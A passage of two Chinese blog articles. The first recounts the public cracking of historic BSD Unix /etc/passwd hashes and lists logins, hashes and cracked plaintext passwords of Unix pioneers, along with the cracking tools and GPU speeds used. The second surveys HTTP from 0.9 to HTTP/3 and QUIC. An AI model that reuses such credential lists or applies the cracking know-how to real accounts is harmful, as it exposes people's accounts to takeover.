dmr:gfVwhuAMF0Trw:42:10:Dennis Ritchie:/usr/staff/dmr:
ken:ZghOT0eRm4U9s:52:10:& Thompson:/usr/staff/ken:
sif:IIVxQSvq1V9R2:53:10:Stuart Feldman:/usr/staff/sif:
scj:IL2bmGECQJgbk:60:10:Steve Johnson:/usr/staff/scj:
pjw:N33.MCNcTh5Qw:61:10:Peter J. Weinberger,2015827214:/usr/staff/pjw:/bin/csh
bwk:ymVglQZjbWYDE:62:10:Brian W. Kernighan,2015826021:/usr/staff/bwk:
uucp:P0CHBwE/mB51k:66:10:UNIX-to-UNIX Copy:/usr/spool/uucp:/usr/lib/uucp/uucico
srb:c8UdIntIZCUIA:68:10:Steve Bourne,2015825829:/usr/staff/srb:
finger::199:199:The & Program:/usr/ucb:/usr/ucb/finger
who::199:199:The & Program:/usr/ucb:/bin/who
w::199:199:The & Program:/usr/ucb:/usr/ucb/w
mckusick:AAZk9Aj5/Ue0E:201:10:Kirk &,4156424948:/usr/staff/mckusick:/bin/csh
peter:Nc3IkFJyW2u7E:202:10:& Kessler,4156424948:/usr/staff/peter:/bin/csh
henry:lj1vXnxTAPnDc:203:10:Robert &,4156424948:/usr/staff/henry:/bin/csh
jkf:9ULn5cWTc0b9E:209:10:John Foderaro,4156424972:/usr/staff/jkf:/bin/csh
fateman:E9i8fWghn1p/I:300:10:Richard &,4156421879:/usr/staff/fateman:/bin/csh
fabry:d9B17PTU2RTlM:305:10:Bob &,4156422714:/usr/staff/fabry:/bin/csh
network:9EZLtSYjeEABE:501:50:*:/usr/net/network:/usr/net/network/nsh
tty::504:50::/:/bin/tty我
```

（注，以前Unix是一个服务器，所有人都用一个终端到服务器上进行操作，于是，这个服务上的 `/etc/passwd` 下保存着所有的人的登录密码，能让所有的人都能读到，为了不让别人猜到，这个文件中的密码保存（第二列）被做过哈希处理）

这位程序员一看，这些个用户不就是[Dennis Ritchie](https://en.wikipedia.org/wiki/Dennis_Ritchie), [Ken Thompson](https://en.wikipedia.org/wiki/Ken_Thompson), [Brian W. Kernighan](https://en.wikipedia.org/wiki/Brian_Kernighan), [Steve Bourne](https://en.wikipedia.org/wiki/Stephen_R._Bourne), [Bill Joy](https://en.wikipedia.org/wiki/Bill_Joy) 这些神人的密码吗？！于是，他想看看这些人用什么样的密码。考虑到当时的加密算法用的是基于DES的 [crypt(3)](https://minnie.tuhs.org/cgi-bin/utree.pl?file=V7/usr/man/man3/crypt.3) 算法（这个算法今天还在用，像Perl/PHP/Python/Ruby都提供`crypt()` 函数），而且当时的密码最长只支持8个长度，所以，感觉还是很容易暴力破解的。

一般来说，暴力破解的这种hash密码的工具主要是用[hashcat](https://hashcat.net/) 或 [john](https://www.openwall.com/john/) ，很快，Leah 破解了大多数人的密码，因为大多数都使用的是比较弱的密码，比如： [Brian W. Kernighan](https://en.wikipedia.org/wiki/Brian_Kernighan) （`bwk`）使用了 `/.,/.,` 这样的密码，而 [Dennis Ritchie](https://en.wikipedia.org/wiki/Dennis_Ritchie) （`dmr`）则使用了 `dmac` 这样的密码。然后，在破解到 Ken Thompson的密码时，搞不定了，花了好几天穷举完了所有的小写字母+数字都没有找到。

因为这个`crypt`的算法也是Ken Thompson 和 Robert Morris 写的，他们在40年前就发现，原来的hash算法太快了，这样很容易被暴力穷举，于是在第七版的Unix（1979年发布），他们把算法改成DES的算法，就是要让这个算法变慢。详细地说，用户密码被截断为八个字符，每个字符仅被压缩为7位。这形成56位DES密钥。然后，该密钥用于加密全零位块，然后再次使用相同的密钥对密文进行加密，依此类推，总共进行了25次DES加密。感觉跟区块链的“挖矿”有点像。**在最早的Unix计算机上，这个算法需要花了整整一秒钟的时间来计算密码哈希**。

这几十年来，计算机的计算速度根据摩尔定律至少double了20次，所以，DES算法已经很容被攻击了，然而，对于Ken Thompson的密码，在2014年还是很不容易被破解的，因为，**如果要加上所有的大小写字符数字和其它特殊字符，那么，在2014年，就算用最快的GPU来穷举所有的8位长度的密码，也需要花上至少2年以上的时间**。

在2019年10月份，在 [The Unix Heritage Society](https://www.tuhs.org/) 这个社区中，[这个事又被人问起来](https://inbox.vuxu.org/tuhs/6dceffe228804a76de1e12f18d1fc0dc@inventati.org/)，说以前有个人破解这些密码，不知道有没有全破解出来了？于是Leah看到了，就回应说，那个人是我，但是还是没干出来……于是好些人进来留言。

5天后，2019年10月08日，一个来自澳大利亚的程序员Nigel Williams说，[Ken的密码我破解出来了](https://inbox.vuxu.org/tuhs/CACCFpdx_6oeyNkgH_5jgfxbxWbZ6VtOXQNKOsonHPF2=747ZOw@mail.gmail.com/)，哈希串`ZghOT0eRm4U9s` 明文是 `p/q2-q4!`（果然是有数字有特殊字符），小伙说，我在 AMD Radeon Vega 64 的 GPU上运行了 `hashcat` 这个命令，干了我 4天多，每秒钟的“配速”是930MH/s （每秒钟9亿3千万次hash运算）。然后，[Ken Thompson 也留言到 “恭喜”](https://inbox.vuxu.org/tuhs/CAG=a+rj8VcXjS-ftaj8P2_duLFSUpmNgB4-dYwnTsY_8g5WdEA@mail.gmail.com/) ，这样，Ken 的密码在40年后被破解了……

马上，就有人问到，这个密码是不是国际象棋的走棋？嗯，很像中国象棋中的“车五进一”，“马三退一”，这个密码中的 `p` 代表 `pawn` 小兵，从 `q2` 的位置走到 `q4`，这个看来是国际象棋中的开局进兵——用来做登录密码，非常合适。而且，Ken Thompson 在 Unix中写下的一个国际象棋的程序 [Belle](https://en.wikipedia.org/wiki/Belle_(chess_machine))，在1978年首次参加[计算机协会的北美计算机国际象棋锦标赛](https://en.wikipedia.org/wiki/North_American_Computer_Chess_Championship)时，它获得了第一个冠军头衔，其搜索深度为八层。之后又赢得了四次冠军。1983年，它也成为第一台获得国际象棋“大师”称号的计算机。所以，Ken用这个做密码相当make sense!

![img](photo/ken.chess_.jpg)Ken在贝尔实验室调程序（图片来源：[IEEE SPECTRUM](https://spectrum.ieee.org/tech-history/silicon-revolution/in-1983-this-bell-labs-computer-was-the-first-machine-to-become-a-chess-master)）

当然，还有一个人的密码是所有人里最难破解的，这个人就是[Bill Joy](https://en.wikipedia.org/wiki/Bill_Joy)，他最初作为加州大学伯克利分校的研究生，在校期间着手改进Unix 内核，并管理BSD发行版。他最著名的贡献是ex和vi编辑器以及C shell。在Sun公司成立6个月后，他正式成为公司的联合创始人，他在Sun公司的推动了NFS，SPARC处理器，以及Java语言。他还是一个风险投资人员。

在Ken的密被破解后两周（2019年10月19日），有人号称已经破解了Bill的密码，他在[邮件组中这样写到](https://minnie.tuhs.org/pipermail/tuhs/2019-October/019124.html)：

> 一开始，我使用了大小写字符和数字，8位长度来破解所有的组合，花了我6天的时间，失败了。然后，我开始尝试只用小写字母和控制字符，结果在40分钟内就破解了。但是因为Bill现健在，所以，只要bill同意他才公布这个密码。

在密码里存控制字符？这脑洞，Ctrl+C么？破解者还说，他在一个有三个结点的DELL 的HPC集群上完成这个工作，每个结点包括两个 Tesla V100 nVidia GPU 的显卡，一共30720个CUDA核…… 关于这个显卡多少钱，你可以上网搜吧…… 相当于一块劳力士吧……（我估计这组机器平时是用来挖矿的……[狗头]）

好了，我们来看一下这个 `/etc/passwd` 中的这些人的密码是什么样的，**但最主要的是向这些为人类做过巨大贡献的程序员科学家们致敬**！

- [Ken Thompson](https://en.wikipedia.org/wiki/Ken_Thompson)

  除了是Unix、B语言和Go语言作者之外，他还贡献过正则表达式，QED/ed编辑器，UTF-8编码定义，以及计算机国际象棋Belle……

  

  | 登录名 | **哈希串**      | **密码**   |
  | ------ | --------------- | ---------- |
  | `ken`  | `ZghOT0eRm4U9s` | `p/q2-q4!` |

- [Dennis Ritchie](https://en.wikipedia.org/wiki/Dennis_Ritchie)

  Unix和C语言之父，与Ken于1983年获图灵奖，1990年美国国家海明奖章，于2011年去世。

  

  | 登录名 | **哈希串**      | **密码** |
  | ------ | --------------- | -------- |
  | `dmr`  | `gfVwhuAMF0Trw` | `dmac`   |

- [Brian W. Kernighan](https://en.wikipedia.org/wiki/Brian_Kernighan)

  AWK的作者，是AWK中的“K”，也是与Dennis写的K&C的C语言编程书中的“K”，他还编写了很多Unix的其它程序，如：

  ```
  ditroff
  ```

  ，而且，设计了著名的

  启发式算法

  。

  

  | 登录名 | **哈希串**      | **密码** |
  | ------ | --------------- | -------- |
  | `bwk`  | `ymVglQZjbWYDE` | `/.,/.,` |

- [Stephen R. Bourne](https://en.wikipedia.org/wiki/Stephen_R._Bourne)

  Bourne shell（

  ```
  sh
  ```

  ）的作者，Unix Shell作者，同时也是Unix调试器的作者。

  

  | 登录名 | **哈希串**      | **密码** |
  | ------ | --------------- | -------- |
  | `srb`  | `c8UdIntIZCUIA` | `bourne` |

- [Eric Schmidt](https://en.wikipedia.org/wiki/Eric_Schmidt)

  你可能知道他是Google的CEO，苹果的董事，但是你可能不知道，他当年是是贝尔实施室的实习生，他对Unix的词法分析器 Lex 进行为了完全的重写。他的密码是中的wendy应该是他的妻子。

  

  | 登录名    | **哈希串**      | **密码**   |
  | --------- | --------------- | ---------- |
  | `schmidt` | `FH83PFo4z55cU` | `wendy!!!` |

- [Stuart Feldman](https://en.wikipedia.org/wiki/Stuart_Feldman)

  他除了是Unix系统小组的成员，他还是第一个Fortran 77 编译器的作者，也是

   

  ```
  make
  ```

   的作者。他还是楼上Shmidt慈善基金会的科学负责人，在Google/IBM Research任过职，也担任过ACM的主席。

  

  | 登录名 | **哈希串**      | **密码**  |
  | ------ | --------------- | --------- |
  | `sif`  | `IIVxQSvq1V9R2` | `axolotl` |

- [Mark Horton](https://en.wikipedia.org/wiki/Mary_Ann_Horton)

  Unix贡献者，包括vi和curses，后来变性为女性，新的名字叫Mary Ann Horton。原来的照片在

  Unix Guru Universe

  

  | 登录名 | **哈希串**      | **密码** |
  | ------ | --------------- | -------- |
  | `mark` | `Pb1AmSpsVPG0Y` | `uio`    |

- [Kirk McKusick](https://en.wikipedia.org/wiki/Marshall_Kirk_McKusick)

  BSD贡献者，主要负责文件系统UFS以及fsck命令，同时也是

  ```
  gprof
  ```

  的贡献者，公开的同性恋者。

  

  | 登录名     | **哈希串**      | **密码** |
  | ---------- | --------------- | -------- |
  | `mckusick` | `AAZk9Aj5/Ue0E` | `foobar` |

- [Richard Fateman](https://en.wikipedia.org/wiki/Richard_Fateman)

  他在伯克利的VAX UNIX系统的开发工作中发挥了重要作用，以及开发了

   Franz Lisp

  。

  

  | 登录名    | **哈希串**      | **密码**  |
  | --------- | --------------- | --------- |
  | `fateman` | `E9i8fWghn1p/I` | `apr1744` |

- Peter Kessler

  这位老兄能在网上查到的资料基本没有，可以查到他是

   

  ```
  gprof
  ```

   

  的贡献者，以及有名字的

  gprof的一篇论文

  

  | 登录名  | **哈希串**      | **密码**   |
  | ------- | --------------- | ---------- |
  | `peter` | `Nc3IkFJyW2u7E` | `...hello` |

- Kurt Shoens

  BSD电子邮件开发者。Unix早期版本中使用

   

  ```
  uux
  ```

   

  和

   

  ```
  sendmail
  ```

   

  来进行远程消息传递，1978年，Kurt为Unix编写了一个邮件用户代理 Berkeley Mail。相关的历史可以参看

  这篇文章

  。

  

  | 登录名 | **哈希串**      | **密码**   |
  | ------ | --------------- | ---------- |
  | `kurt` | `olqH1vDqH38aw` | `sacristy` |

- [John Foderaro](https://franz.com/about/press_room/foderaro_2-2-2015.lhtml)

  他为Berkeley的Lisp语言编写原始的编译器，Lisp语言是一种类似于数据代数的语言，在计算机历史上有和C语言一样的作用。后来他成立了Franz公司，主要开发和部署图形搜索解决方案。

  

  | 登录名 | **哈希串**      | **密码**   |
  | ------ | --------------- | ---------- |
  | `jkf`  | `9ULn5cWTc0b9E` | `sherril.` |

- [Peter J. Weinberger](https://en.wikipedia.org/wiki/Peter_J._Weinberger)

  他就是AWK中的那个“W”，同时也是Fortan编译器f77的贡献者，后来是

  Renaissance Technologies

   

  （一家对冲基金）的CTO，现在在Google工作，

  

  | 登录名 | **哈希串**      | **密码**   |
  | ------ | --------------- | ---------- |
  | `pjw`  | `N33.MCNcTh5Qw` | `uucpuucp` |

- John Reiser

  他主要工作是将Unix和C移植到了DEC VAX上，这个机器在学术界相当流行（陈皓注：我在1994年上大学的时候，就是在这个机器上学习的C语言）。这扩大了Unix和C的影响力。

  

  | 登录名 | **哈希串**      | **密码** |
  | ------ | --------------- | -------- |
  | `jfr`  | `X.ZNnZrciWauE` | `5%ghj`  |

- [Steve Johnson](https://en.wikipedia.org/wiki/Stephen_C._Johnson)

  曾在贝尔实验室和AT＆T工作近20年。他以Yacc，Lint，spell和Portable C编译器而闻名。后来他去了硅谷，加入了一些创业公司，主要从事编译器的工作，以及2D和3D图形，大规模并行系统和嵌入式系统的开发工作。现在他在Wave Computing从事机器学习的工作。

  

  | 登录名 | **哈希串**      | **密码** |
  | ------ | --------------- | -------- |
  | `scj`  | `IL2bmGECQJgbk` | `pdq;dq` |

- Bob Kridle

  这位老兄的资料在没有太多，只能在

   

  Berkeley Unix 20 年

   

  上看到他跟Ken Thompson混过一段时间。

  

  | 登录名   | **哈希串**      | **密码**   |
  | -------- | --------------- | ---------- |
  | `kridle` | `4BkcEieEtjWXI` | `jilland1` |

- [Keith Sklower](https://people.eecs.berkeley.edu/~sklower/)

  BSD 的一个程序员。从他的主页上可以看到他目前在Berkeley大学，信息分析师，主要研究一些网络通信相关的技术。

  

  | 登录名    | **哈希串**      | **密码**   |
  | --------- | --------------- | ---------- |
  | `sklower` | `8PYh/dUBQT9Ss` | `theik!!!` |

- Robert Henry

  网上的资料不多，只在

  Life with Unix

  这本电子书中查到，他写了

   

  ```
  error
  ```

  

  | 登录名  | **哈希串**      | **密码**   |
  | ------- | --------------- | ---------- |
  | `henry` | `lj1vXnxTAPnDc` | `sn74193n` |

- Howard Katseff

  网上的资料不多，只在

  Life with Unix

  这本电子书中查到，他写了

   

  ```
  sdb
  ```

   

  和

   

  ```
  last
  ```

  

  | 登录名 | **哈希串**      | **密码**   |
  | ------ | --------------- | ---------- |
  | `hpk`  | `9ycwM8mmmcp4Q` | `graduat;` |

- [Özalp Babaoğlu](https://en.wikipedia.org/wiki/Özalp_Babaoğlu)

  土耳其计算机科学家，1981年在Berkeley担任 BSD Unix的首席设计师，曾经与Sun的创造人Bill Joy在BSD上实现了虚拟内存。

  

  | 登录名  | **哈希串**      | **密码**   |
  | ------- | --------------- | ---------- |
  | `ozalp` | `m5syt3.lB5LAE` | `12ucdort` |

- [Bob Fabry](https://en.wikipedia.org/wiki/Bob_Fabry)

  他主要推动美国国防部高级研究计划局DARPA采用了Unix系统

  

  | 登录名  | **哈希串**      | **密码**   |
  | ------- | --------------- | ---------- |
  | `fabry` | `d9B17PTU2RTlM` | `561cml..` |

- Tom London

  他和John Reiser在把Unix移植到了VAX-11机上。

  

  | 登录名 | **哈希串**      | **密码**   |
  | ------ | --------------- | ---------- |
  | `tbl`  | `cBWEbG59spEmM` | `..pnn521` |

最后，再首尾呼应一下，在我的技术生涯中，Unix文化对我个人的技术观影响是非常大的，**我个人认为 Unix 就像摇滚乐一样，上世纪60年代-80年代，是整个人类最经典最光亮的时代，值得我们每个人向那个时代的人和事致敬！**

————————————————————————

P.S.

你可以浏览 Github 的 [unix-history-repo](https://github.com/dspinellis/unix-history-repo/tree/BSD-3-Snapshot-Development) 目录（注：本文给的这个链接不在master分支上），这个repo是40年前的代码，涵盖了从1970年创建时的2.5万行内核和26条命令到2017年为止广泛使用的2700万行系统。1.1GB的存储库包含大约一百万次提交和两千多次合并。通过[这个链接](http://www.dmst.aueb.gr/dds/pubs/jrnl/2016-EMPSE-unix-history/html/unix-history.html)你可以了解一下这个代码的历史！

下载这些代码需要你的1.5GB的硬盘空间，你可以查看各个大神写的代码，包括 Ken Thompson 和 Dennis的，以及相关的注释。

根据这些，你还可以找到 Ken Thompson的 Github账号 https://github.com/ken 以及别人为dmr建的github帐号 https://github.com/dmr-1941-2011

P.S.S

下面是一些和Unix相关的维基百科资料

- [History of Unix](https://en.wikipedia.org/wiki/History_of_Unix)
- [List of Unix systems](https://en.wikipedia.org/wiki/List_of_Unix_systems)
- [List of Unix commands](https://en.wikipedia.org/wiki/List_of_Unix_commands)
- [List of Unix daemons](https://en.wikipedia.org/wiki/List_of_Unix_daemons)
- [Research Unix](https://en.wikipedia.org/wiki/Research_Unix)
- [Berkeley Software Distribution](https://en.wikipedia.org/wiki/BSD_Unix)
- [Unix philosophy](https://en.wikipedia.org/wiki/Unix_philosophy)

还有Unix的社区：TUHS: The Unix Heritage Society – [The Unix Tree](http://minnie.tuhs.org/cgi-bin/utree.pl)

（全文完）

# HTTP的前世今生

#####  [2019年10月01日 ](https://coolshell.cn/articles/19840.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [77 条评论](https://coolshell.cn/articles/19840.html#comments) 97,256 人阅读

![img](photo/HTTP-770x513-300x200.jpg)HTTP (Hypertext transfer protocol) 翻译成中文是超文本传输协议，是互联网上重要的一个协议，由欧洲核子研究委员会CERN的英国工程师 [Tim Berners-Lee](https://en.wikipedia.org/wiki/Tim_Berners-Lee) v发明的，同时，他也是WWW的发明人，最初的主要是用于传递通过HTML封装过的数据。在1991年发布了HTTP 0.9版，在1996年发布1.0版，1997年是1.1版，1.1版也是到今天为止传输最广泛的版本（初始[RFC 2068](https://tools.ietf.org/html/rfc2068) 在1997年发布， 然后在1999年被 [RFC 2616](https://tools.ietf.org/html/rfc2616) 取代，再在2014年被 [RFC 7230](https://tools.ietf.org/html/rfc7230) /[7231](https://tools.ietf.org/html/rfc7231)/[7232](https://tools.ietf.org/html/rfc7232)/[7233](https://tools.ietf.org/html/rfc7233)/[7234](https://tools.ietf.org/html/rfc7234)/[7235](https://tools.ietf.org/html/rfc7235)取代），2015年发布了2.0版，其极大的优化了HTTP/1.1的性能和安全性，而2018年发布的3.0版，继续优化HTTP/2，激进地使用UDP取代TCP协议，目前，HTTP/3 在2019年9月26日 被 Chrome，Firefox，和Cloudflare支持，所以我想写下这篇文章，简单地说一下HTTP的前世今生，让大家学到一些知识，并希望可以在推动一下HTTP标准协议的发展。

目录



[HTTP 0.9 / 1.0](https://coolshell.cn/articles/19840.html#HTTP_09_10)[ HTTP/1.1](https://coolshell.cn/articles/19840.html#_HTTP11)[HTTP/2](https://coolshell.cn/articles/19840.html#HTTP2)[HTTP/3](https://coolshell.cn/articles/19840.html#HTTP3)

#### HTTP 0.9 / 1.0

0.9和1.0这两个版本，就是最传统的 request – response的模式了，HTTP 0.9版本的协议简单到极点，请求时，不支持请求头，只支持 `GET` 方法，没了。HTTP 1.0 扩展了0.9版，其中主要增加了几个变化：



- 在请求中加入了HTTP版本号，如：`GET /coolshell/index.html HTTP/1.0`
- HTTP 开始有 header了，不管是request还是response 都有header了。
- 增加了HTTP Status Code 标识相关的状态码。
- 还有 `Content-Type` 可以传输其它的文件了。

我们可以看到，HTTP 1.0 开始让这个协议变得很文明了，一种工程文明。因为：

- 一个协议有没有版本管理，是一个工程化的象征。
- header是协议可以说是把元数据和业务数据解耦，也可以说是控制逻辑和业务逻辑的分离。
- Status Code 的出现可以让请求双方以及第三方的监控或管理程序有了统一的认识。最关键是还是控制错误和业务错误的分离。

（注：国内很多公司HTTP无论对错只返回200，这种把HTTP Status Code 全部抹掉完全是一种工程界的倒退）

但是，HTTP1.0性能上有一个很大的问题，那就是每请求一个资源都要新建一个TCP链接，而且是串行请求，所以，就算网络变快了，打开网页的速度也还是很慢。所以，HTTP 1.0 应该是一个必需要淘汰的协议了。

####  HTTP/1.1

HTTP/1.1 主要解决了HTTP 1.0的网络性能的问题，以及增加了一些新的东西：

- 可以设置 `keepalive` 来让HTTP重用TCP链接，重用TCP链接可以省了每次请求都要在广域网上进行的TCP的三次握手的巨大开销。这是所谓的“**HTTP 长链接**” 或是 “**请求响应式的HTTP 持久链接**”。英文叫 HTTP Persistent connection.
- 然后支持pipeline网络传输，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间。（注：非幂等的POST 方法或是有依赖的请求是不能被pipeline化的）
- 支持 Chunked Responses ，也就是说，在Response的时候，不必说明 `Content-Length` 这样，客户端就不能断连接，直到收到服务端的EOF标识。这种技术又叫 “**服务端Push模型**”，或是 “**服务端Push式的HTTP 持久链接**”
- 还增加了 cache control 机制。
- 协议头注增加了 Language, Encoding, Type 等等头，让客户端可以跟服务器端进行更多的协商。
- 还正式加入了一个很重要的头—— `HOST`这样的话，服务器就知道你要请求哪个网站了。因为可以有多个域名解析到同一个IP上，要区分用户是请求的哪个域名，就需要在HTTP的协议中加入域名的信息，而不是被DNS转换过的IP信息。
- 正式加入了 `OPTIONS` 方法，其主要用于 [CORS – Cross Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) 应用。

HTTP/1.1应该分成两个时代，一个是2014年前，一个是2014年后，因为2014年HTTP/1.1有了一组RFC（[7230](https://tools.ietf.org/html/rfc7230) /[7231](https://tools.ietf.org/html/rfc7231)/[7232](https://tools.ietf.org/html/rfc7232)/[7233](https://tools.ietf.org/html/rfc7233)/[7234](https://tools.ietf.org/html/rfc7234)/[7235](https://tools.ietf.org/html/rfc7235)），这组RFC又叫“HTTP/2 预览版”。其中影响HTTP发展的是两个大的需求：

- 一个需要是加大了HTTP的安全性，这样就可以让HTTP应用得广泛，比如，使用TLS协议。
- 另一个是让HTTP可以支持更多的应用，在HTTP/1.1 下，HTTP已经支持四种网络协议：
  - 传统的短链接。
  - 可重用TCP的的长链接模型。
  - 服务端push的模型。
  - WebSocket模型。

自从2005年以来，整个世界的应用API越来多，这些都造就了整个世界在推动HTTP的前进，我们可以看到，**自2014的HTTP/1.1 以来，这个世界基本的应用协议的标准基本上都是向HTTP看齐了，也许2014年前，还有一些专用的RPC协议，但是2014年以后，HTTP协议的增强，让我们实在找不出什么理由不向标准靠拢，还要重新发明轮子了。**

#### HTTP/2

虽然 HTTP/1.1 已经开始变成应用层通讯协议的一等公民了，但是还是有性能问题，虽然HTTP/1.1 可以重用TCP链接，但是请求还是一个一个串行发的，需要保证其顺序。然而，大量的网页请求中都是些资源类的东西，这些东西占了整个HTTP请求中最多的传输数据量。所以，理论上来说，如果能够并行这些请求，那就会增加更大的网络吞吐和性能。

另外，HTTP/1.1传输数据时，是以文本的方式，借助耗CPU的zip压缩的方式减少网络带宽，但是耗了前端和后端的CPU。这也是为什么很多RPC协议诟病HTTP的一个原因，就是数据传输的成本比较大。

其实，在2010年时，Google 就在搞一个实验型的协议，这个协议叫[SPDY](https://en.wikipedia.org/wiki/SPDY)，这个协议成为了HTTP/2的基础（也可以说成HTTP/2就是SPDY的复刻）。HTTP/2基本上解决了之前的这些性能问题，其和HTTP/1.1最主要的不同是：

- HTTP/2是一个二进制协议，增加了数据传输的效率。
- HTTP/2是可以在一个TCP链接中并发请求多个HTTP请求，移除了HTTP/1.1中的串行请求。
- HTTP/2会压缩头，如果你同时发出多个请求，他们的头是一样的或是相似的，那么，协议会帮你消除重复的部分。这就是所谓的HPACK算法（参看[RFC 7541](https://tools.ietf.org/html/rfc7541) 附录A）
- HTTP/2允许服务端在客户端放cache，又叫服务端push，也就是说，你没有请求的东西，我服务端可以先送给你放在你的本地缓存中。比如，你请求X，我服务端知道X依赖于Y，虽然你没有的请求Y，但我把把Y跟着X的请求一起返回客户端。

对于这些性能上的改善，在Medium上有篇文章你可看一下相关的细节说明和测试“[HTTP/2: the difference between HTTP/1.1, benefits and how to use it](https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b)”

当然，还需要注意到的是HTTP/2的协议复杂度比之前所有的HTTP协议的复杂度都上升了许多许多，其内部还有很多看不见的东西，比如其需要维护一个“优先级树”来用于来做一些资源和请求的调度和控制。如此复杂的协议，自然会产生一些不同的声音，或是降低协议的可维护和可扩展性。所以也有一些争议。尽管如此，HTTP/2还是很快地被世界所采用。

HTTP/2 是2015年推出的，其发布后，Google 宣布移除对SPDY的支持，拥抱标准的 HTTP/2。过了一年后，就有8.7%的网站开启了HTTP/2，根据 [这份报告](https://w3techs.com/technologies/details/ce-http2/all/all) ，截止至本文发布时（2019年10月1日 ）， 在全世界范围内已经有41%的网站开启了HTTP/2。

HTTP/2的官方组织在 Github 上维护了一份[各种语言对HTTP/2的实现列表](https://github.com/http2/http2-spec/wiki/Implementations)，大家可以去看看。

我们可以看到，HTTP/2 在性能上对HTTP有质的提高，所以，HTTP/2 被采用的也很快，所以，**如果你在你的公司内负责架构的话，HTTP/2是你一个非常重要的需要推动的一个事，除了因为性能上的问题，推动标准落地也是架构师的主要职责，因为，你企业内部的架构越标准，你可以使用到开源软件，或是开发方式就会越有效率，跟随着工业界的标准的发展，你的企业会非常自然的享受到标准所带来的红利。**

#### HTTP/3

然而，这个世界没有完美的解决方案，HTTP/2也不例外，其主要的问题是：若干个HTTP的请求在复用一个TCP的连接，底层的TCP协议是不知道上层有多少个HTTP的请求的，所以，一旦发生丢包，造成的问题就是所有的HTTP请求都必需等待这个丢了的包被重传回来，哪怕丢的那个包不是我这个HTTP请求的。因为TCP底层是没有这个知识了。

这个问题又叫[Head-of-Line Blocking](https://en.wikipedia.org/wiki/Head-of-line_blocking)问题，这也是一个比较经典的流量调度的问题。这个问题最早主要的发生的交换机上。下图来自Wikipedia。

![img](photo/HOL_blocking.png)

图中，左边的是输入队列，其中的1，2，3，4表示四个队列，四个队列中的1，2，3，4要去的右边的output的端口号。此时，第一个队列和第三个队列都要写右边的第四个端口，然后，一个时刻只能处理一个包，所以，一个队列只能在那等另一个队列写完后。然后，其此时的3号或1号端口是空闲的，而队列中的要去1和3号端号的数据，被第四号端口给block住了。这就是所谓的HOL blocking问题。

HTTP/1.1中的pipeline中如果有一个请求block了，那么队列后请求也统统被block住了；HTTP/2 多请求复用一个TCP连接，一旦发生丢包，就会block住所有的HTTP请求。这样的问题很讨厌。好像基本无解了。

是的TCP是无解了，但是UDP是有解的 ！**于是HTTP/3破天荒地把HTTP底层的TCP协议改成了UDP！**

然后又是Google 家的协议进入了标准 – QUIC （Quick UDP Internet Connections）。接下来是QUIC协议的几个重要的特性，为了讲清楚这些特性，我需要带着问题来讲（注：下面的网络知识，如果你看不懂的话，你需要学习一下《[TCP/IP详解](https://book.douban.com/subject/1088054/)》一书（在我写blog的这15年里，这本书推荐了无数次了），或是看一下本站的《[TCP的那些事](https://coolshell.cn/articles/11564.html)》。）：

- 首先是上面的Head-of-Line blocking问题，在UDP的世界中，这个就没了。这个应该比较好理解，因为UDP不管顺序，不管丢包（当然，QUIC的一个任务是要像TCP的一个稳定，所以QUIC有自己的丢包重传的机制）
- TCP是一个无私的协议，也就是说，如果网络上出现拥塞，大家都会丢包，于是大家都会进入拥塞控制的算法中，这个算法会让所有人都“冷静”下来，然后进入一个“慢启动”的过程，包括在TCP连接建立时，这个慢启动也在，所以导致TCP性能迸发地比较慢。QUIC基于UDP，使用更为激进的方式。同时，QUIC有一套自己的丢包重传和拥塞控制的协，一开始QUIC是重新实现一TCP 的 CUBIC算法，但是随着BBR算法的成熟（BBR也在借鉴CUBIC算法的数学模型），QUIC也可以使用BBR算法。这里，多说几句，**从模型来说，以前的TCP的拥塞控制算法玩的是数学模型，而新型的TCP拥塞控制算法是以BBR为代表的测量模型**，理论上来说，后者会更好，但QUIC的团队在一开始觉得BBR不如CUBIC的算法好，所以没有用。现在的BBR 2.x借鉴了CUBIC数学模型让拥塞控制更公平。这里有文章大家可以一读“[TCP BBR : Magic dust for network performance.](https://medium.com/google-cloud/tcp-bbr-magic-dust-for-network-performance-57a5f1ccf437)”
- 接下来，现在要建立一个HTTPS的连接，先是TCP的三次握手，然后是TLS的三次握手，要整出六次网络交互，一个链接才建好，虽说HTTP/1.1和HTTP/2的连接复用解决这个问题，但是基于UDP后，UDP也得要实现这个事。于是QUIC直接把TCP的和TLS的合并成了三次握手（对此，在HTTP/2的时候，是否默认开启TLS业内是有争议的，反对派说，TLS在一些情况下是不需要的，比如企业内网的时候，而支持派则说，TLS的那些开销，什么也不算了）。

| ![img](photo/http-request-over-tcp-tls@2x-292x300.png) | ![img](photo/http-request-over-quic@2x-300x215.png) |
| ------------------------------------------------------ | --------------------------------------------------- |
|                                                        |                                                     |

 

所以，QUIC是一个在UDP之上的伪TCP +TLS +HTTP/2的多路复用的协议。

但是对于UDP还是有一些挑战的，这个挑战主要来自互联网上的各种网络设备，这些设备根本不知道是什么QUIC，他们看QUIC就只能看到的就是UDP，所以，在一些情况下，UDP就是有问题的，

- 比如在NAT的环境下，如果是TCP的话，NAT路由或是代理服务器，可以通过记录TCP的四元组（源地址、源端口，目标地址，目标端口）来做连接映射的，然而，在UDP的情况下不行了。于是，QUIC引入了个叫connection id的不透明的ID来标识一个链接，用这种业务ID很爽的一个事是，如果你从你的3G/4G的网络切到WiFi网络（或是反过来），你的链接不会断，因为我们用的是connection id，而不是四元组。

- 然而就算引用了connection id，也还是会有问题 ，比如一些不够“聪明”的等价路由交换机，这些交换机会通过四元组来做hash把你的请求的IP转到后端的实际的服务器上，然而，他们不懂connection id，只懂四元组，这么导致属于同一个connection id但是四元组不同的网络包就转到了不同的服务器上，这就是导致数据不能传到同一台服务器上，数据不完整，链接只能断了。所以，你需要更聪明的算法（可以参看 Facebook 的 [Katran](https://github.com/facebookincubator/katran) 开源项目 ）

好了，就算搞定上面的东西，还有一些业务层的事没解，这个事就是 HTTP/2的头压缩算法 HPACK，HPACK需要维护一个动态的字典表来分析请求的头中哪些是重复的，HPACK的这个数据结构需要在encoder和decoder端同步这个东西。在TCP上，这种同步是透明的，然而在UDP上这个事不好干了。所以，这个事也必需要重新设计了，基于QUIC的QPACK就出来了，利用两个附加的QUIC steam，一个用来发送这个字典表的更新给对方，另一个用来ack对方发过来的update。

